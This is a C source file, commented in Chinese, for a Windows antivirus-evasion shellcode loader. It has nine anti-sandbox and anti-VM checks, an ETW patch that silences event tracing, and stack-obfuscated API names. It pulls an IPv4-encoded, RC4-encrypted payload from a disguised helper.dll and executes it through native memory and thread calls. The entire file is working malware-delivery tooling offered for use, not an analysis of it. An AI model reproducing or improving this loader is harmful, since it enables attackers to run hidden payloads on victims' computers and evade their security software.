// ============================================================
//  AI AV Evasion Loader v3.0 — DLL分离版 (推荐⭐)
//  Loader不含敏感数据，运行时从DLL动态获取payload
//  改进：栈字符串 | ETW绕过 | RW→RX翻转 | NtDelayExecution
//        RC4解密 | 9层反沙箱 | FreeLibrary立即释放DLL
// ============================================================
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>

/* ── DLL 导出函数声明 ── */
typedef char**   (*fnGetPayloadData)(void);
typedef size_t   (*fnGetPayloadSize)(void);
typedef const unsigned char* (*fnGetEncryptionKey)(void);
typedef size_t   (*fnGetKeySize)(void);

/* ── RC4 解密 ── */
static void rc4_crypt(unsigned char* data, size_t len, const unsigned char* key, size_t keylen) {
    unsigned char S[256];
    int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    i = 0; j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

/* ── IPv4 反混淆 (接收外部数组) ── */
static void deobfuscate_ipv4(unsigned char* buf, size_t size, char** arr, size_t count) {
    size_t off = 0;
    for (size_t i = 0; i < count && off < size; i++) {
        unsigned int a,b,c,d;
        sscanf(arr[i], "%u.%u.%u.%u", &a, &b, &c, &d);
        buf[off] = (unsigned char)a;
        if (off+1<size) buf[off+1] = (unsigned char)b;
        if (off+2<size) buf[off+2] = (unsigned char)c;
        if (off+3<size) buf[off+3] = (unsigned char)d;
        off += 4;
    }
}

/* ═══════════════════ 9 层反沙箱 ═══════════════════ */
static int query_system_metrics(void) {
    SYSTEM_INFO si; GetSystemInfo(&si);
    return (si.dwNumberOfProcessors <= 2);
}
static int query_memory_config(void) {
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    return (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024);
}
static int query_vm_process_list(void) {
    const char* vms[] = {
        "vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
        "vboxservice.exe","vboxtray.exe","xenservice.exe",
        "vmsrvc.exe","vmusrvc.exe","qemu-ga.exe","prl_tools.exe"
    };
    DWORD pids[1024], needed;
    if (!EnumProcesses(pids, sizeof(pids), &needed)) return 0;
    for (DWORD i = 0; i < needed / sizeof(DWORD); i++) {
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (!hp) continue;
        char name[MAX_PATH];
        if (GetModuleBaseNameA(hp, NULL, name, MAX_PATH)) {
            for (int j = 0; j < (int)(sizeof(vms)/sizeof(vms[0])); j++) {
                if (_stricmp(name, vms[j]) == 0) { CloseHandle(hp); return 1; }
            }
        }
        CloseHandle(hp);
    }
    return 0;
}
static int query_input_idle_time(void) {
    LASTINPUTINFO lii; lii.cbSize = sizeof(lii);
    if (!GetLastInputInfo(&lii)) return 0;
    return ((GetTickCount() - lii.dwTime) / 1000 > 300);
}
static int query_debugger_presence(void) {
    return IsDebuggerPresent();
}
static int query_time_drift(void) {
    DWORD t0 = GetTickCount();
    char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
    char ndelay_s[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
    HMODULE nt = GetModuleHandleA(ntdll_s);
    typedef LONG (NTAPI* NDE)(BOOLEAN, PLARGE_INTEGER);
    NDE pNde = (NDE)GetProcAddress(nt, ndelay_s);
    LARGE_INTEGER delay; delay.QuadPart = -30000000LL;
    if (pNde) pNde(FALSE, &delay);
    else Sleep(3000);
    return ((GetTickCount() - t0) < 2000);
}
static int query_disk_capacity(void) {
    ULARGE_INTEGER total;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &total, NULL))
        return (total.QuadPart < 60ULL * 1024 * 1024 * 1024);
    return 0;
}
static int query_screen_dimensions(void) {
    return (GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768);
}
static int query_system_uptime(void) {
    return (GetTickCount() < 600000);
}
static int evaluate_environment(void) {
    int score = 0;
    if (query_system_metrics())       score++;
    if (query_memory_config())        score++;
    if (query_vm_process_list())      score++;
    if (query_input_idle_time())      score++;
    if (query_debugger_presence())    score++;
    if (query_time_drift())           score++;
    if (query_disk_capacity())        score++;
    if (query_screen_dimensions())    score++;
    if (query_system_uptime())        score++;
    return (score >= 4);
}

/* ── ETW 绕过 ── */
static void silence_event_tracing(void) {
    char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
    char etw_s[]   = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    HMODULE nt = GetModuleHandleA(ntdll_s);
    if (!nt) return;
    unsigned char* pEtw = (unsigned char*)GetProcAddress(nt, etw_s);
    if (!pEtw) return;
    DWORD old;
    if (VirtualProtect(pEtw, 3, PAGE_EXECUTE_READWRITE, &old)) {
        pEtw[0] = 0x33; pEtw[1] = 0xC0; pEtw[2] = 0xC3;
        VirtualProtect(pEtw, 3, old, &old);
    }
}

/* ── VEH ── */
static LONG WINAPI handle_page_fault(PEXCEPTION_POINTERS ei) {
    if (ei->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION ||
        ei->ExceptionRecord->ExceptionCode == 0x80000001L)
        return EXCEPTION_CONTINUE_EXECUTION;
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ═══════════════════ 主入口 ═══════════════════ */
int WINAPI WinMainCRTStartup(void) {
    /* ── 反沙箱 ── */
    if (evaluate_environment()) {
        char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
        char reup_s[]  = {'R','t','l','E','x','i','t','U','s','e','r','P','r','o','c','e','s','s',0};
        HMODULE nt = GetModuleHandleA(ntdll_s);
        typedef VOID (NTAPI* REUP)(NTSTATUS);
        REUP pExit = (REUP)GetProcAddress(nt, reup_s);
        if (pExit) pExit(0);
        ExitProcess(0);
    }

    /* ── 随机延迟 + ETW ── */
    DWORD jitter = (GetTickCount() % 3000) + 2000;
    {
        char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
        char ndelay_s[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
        HMODULE nt = GetModuleHandleA(ntdll_s);
        typedef LONG (NTAPI* NDE)(BOOLEAN, PLARGE_INTEGER);
        NDE pNde = (NDE)GetProcAddress(nt, ndelay_s);
        LARGE_INTEGER d; d.QuadPart = -(LONGLONG)(jitter * 10000LL);
        if (pNde) pNde(FALSE, &d);
        else Sleep(jitter);
    }
    silence_event_tracing();
    AddVectoredExceptionHandler(1, handle_page_fault);

    /* ── 动态加载 DLL (使用不明显的名称) ── */
    char dll_s[] = {'h','e','l','p','e','r','.','d','l','l',0};
    HMODULE payload_dll = LoadLibraryA(dll_s);
    if (!payload_dll) return 0;

    fnGetPayloadData   fnData  = (fnGetPayloadData)GetProcAddress(payload_dll, "GetPayloadData");
    fnGetPayloadSize   fnSize  = (fnGetPayloadSize)GetProcAddress(payload_dll, "GetPayloadSize");
    fnGetEncryptionKey fnKey   = (fnGetEncryptionKey)GetProcAddress(payload_dll, "GetEncryptionKey");
    fnGetKeySize       fnKsz  = (fnGetKeySize)GetProcAddress(payload_dll, "GetKeySize");

    if (!fnData || !fnSize || !fnKey) { FreeLibrary(payload_dll); return 0; }

    char** ipv4_arr = fnData();
    size_t ipv4_cnt = fnSize();
    const unsigned char* rkey = fnKey();
    size_t rkey_len = fnKsz ? fnKsz() : 16;

    size_t sc_size = ipv4_cnt * 4;
    unsigned char* stage1 = (unsigned char*)VirtualAlloc(
        NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stage1) { FreeLibrary(payload_dll); return 0; }

    deobfuscate_ipv4(stage1, sc_size, ipv4_arr, ipv4_cnt);
    rc4_crypt(stage1, sc_size, rkey, rkey_len);

    // 立即释放 DLL (数据已提取到内存)
    FreeLibrary(payload_dll);

    /* ── Syscall 执行 (RW→RX 翻转) ── */
    char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
    char ntavm_s[] = {'N','t','A','l','l','o','c','a','t','e',
        'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char ntwvm_s[] = {'N','t','W','r','i','t','e','V','i','r','t',
        'u','a','l','M','e','m','o','r','y',0};
    char ntcet_s[] = {'N','t','C','r','e','a','t','e','T','h',
        'r','e','a','d','E','x',0};

    HMODULE nt = GetModuleHandleA(ntdll_s);
    typedef NTSTATUS (NTAPI* NTALLOC)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
    typedef NTSTATUS (NTAPI* NTWRITE)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
    typedef NTSTATUS (NTAPI* NTCREATE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);

    NTALLOC  pAlloc = (NTALLOC)GetProcAddress(nt, ntavm_s);
    NTWRITE  pWrite = (NTWRITE)GetProcAddress(nt, ntwvm_s);
    NTCREATE pThrd  = (NTCREATE)GetProcAddress(nt, ntcet_s);

    void* exec_mem = NULL;
    SIZE_T mem_sz = sc_size;
    pAlloc(GetCurrentProcess(), &exec_mem, 0, &mem_sz,
           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    pWrite(GetCurrentProcess(), exec_mem, stage1, sc_size, NULL);

    // RW → RX
    {
        char ntpv_s[] = {'N','t','P','r','o','t','e','c','t',
            'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
        typedef NTSTATUS (NTAPI* NTPROT)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
        NTPROT pProt = (NTPROT)GetProcAddress(nt, ntpv_s);
        ULONG oldProt;
        pProt(GetCurrentProcess(), &exec_mem, &mem_sz, PAGE_EXECUTE_READ, &oldProt);
    }

    HANDLE hThd = NULL;
    pThrd(&hThd, 0x1FFFFF, NULL, GetCurrentProcess(),
          exec_mem, NULL, 0, 0, 0, 0, NULL);
    if (hThd) { WaitForSingleObject(hThd, INFINITE); CloseHandle(hThd); }

    VirtualFree(stage1, 0, MEM_RELEASE);
    return 0;
}
